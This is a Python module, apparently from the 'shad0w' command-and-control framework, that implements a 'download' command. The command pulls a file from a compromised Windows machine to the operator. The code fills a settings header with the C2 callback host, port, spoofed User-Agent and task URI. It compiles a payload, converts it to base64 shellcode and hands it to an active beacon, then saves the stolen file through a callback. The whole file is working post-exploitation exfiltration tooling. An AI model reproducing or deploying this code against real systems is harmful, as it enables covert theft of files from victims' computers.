#
# Upload a file
#

import os
import base64
import argparse

from lib import buildtools

__description__ = "Download a file from the target machine to shad0ws current directory"
__author__ = "@_batsec_"

from lib.basecommand import BaseCommand

EXEC_ID = 0x3000

# name of the file to download
FILE_TO_DOWLOAD = ""


class DownloadCommand(BaseCommand):
    def __init__(self, args):
        BaseCommand.__init__(self, "download", args)

    def parse_parameters(self):
        self.parser.add_argument("file", nargs='*', help="File you want to download")

    def get_usage(self):
        return """

Examples:

download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
"""

    def run(self, shad0w):
        global FILE_TO_DOWLOAD
        # make this variable global so the call back can access it
        FILE_TO_DOWLOAD = self.args.file

        # clean up the file name
        read_file = ' '.join(self.args.file).replace('\\', "\\\\").replace('"', '')

        # clone all the source files
        buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/download/",
                                      builddir="/root/shad0w/modules/windows/download/build")

        # set the correct settings
        template = """#define _C2_CALLBACK_ADDRESS L"%s"
        #define _C2_CALLBACK_PORT %s
        #define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
        #define _C2CALLBACK_URI L"/tasks"
        #define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\\r\\n"
        #define _HEADER_LEN -1
        #define SESSION_ID "%s"
        #define DO_CALLBACK 0x4000
        #define FILENAME "%s" """ % (shad0w.endpoint, shad0w.addr[1], shad0w.current_beacon, read_file)

        buildtools.update_settings_file(None, custom_template=template,
                                        custom_path="/root/shad0w/modules/windows/download/build/settings.h")

        # compile the module
        buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/download/build",
                                 modlocation="/root/shad0w/modules/windows/download/module.exe", arch="x64")

        # get the shellcode from the module
        rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/download/module.exe",
                                             want_base64=True)

        # set a task for the current beacon to do
        shad0w.beacons[shad0w.current_beacon]["callback"] = download_callback
        shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)


def download_callback(shad0w, data):
    global FILE_TO_DOWLOAD

    shad0w.beacons[shad0w.current_beacon]["callback"] = None

    FILE_TO_DOWLOAD = ''.join(FILE_TO_DOWLOAD)

    shad0w.debug.good(f"Downloading '{FILE_TO_DOWLOAD}' ({len(data)} bytes)")

    # change to the dir of the folder mapped to the users current dir
    os.chdir("/root/shad0w/.bridge")

    # os.unlink(FILE_TO_DOWLOAD)

    with open(FILE_TO_DOWLOAD, 'wb') as file:
        file.write(base64.b64decode(data))

    # change the dir to our root
    os.chdir("/root/shad0w/")

    shad0w.debug.good(f"Downloaded")

    return ""


def main(shad0w, args):
    global FILE_TO_DOWLOAD

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return

    cmd = DownloadCommand(args)
    if cmd.parse():
        cmd.run(shad0w)


